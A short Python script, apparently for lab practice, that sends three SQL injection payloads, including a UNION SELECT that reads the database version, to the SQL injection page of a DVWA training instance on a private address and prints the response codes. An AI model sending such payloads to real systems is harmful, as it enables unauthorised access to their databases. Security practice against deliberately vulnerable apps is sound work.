#!/usr/bin/env python3
# WARNING: Use only in your own isolated lab environment.
import requests
TARGET = "http://192.168.10.20/DVWA/vulnerabilities/sqli/"
COOKIES = {"PHPSESSID": "<your_session>", "security": "low"}
PAYLOADS = ["' OR '1'='1", "1' OR '1'='1' --", "1 UNION SELECT null, version() --"]
for p in PAYLOADS:
    r = requests.get(TARGET, params={"id": p, "Submit": "Submit"}, cookies=COOKIES)
    print(f"[+] {p!r} -> {r.status_code}")
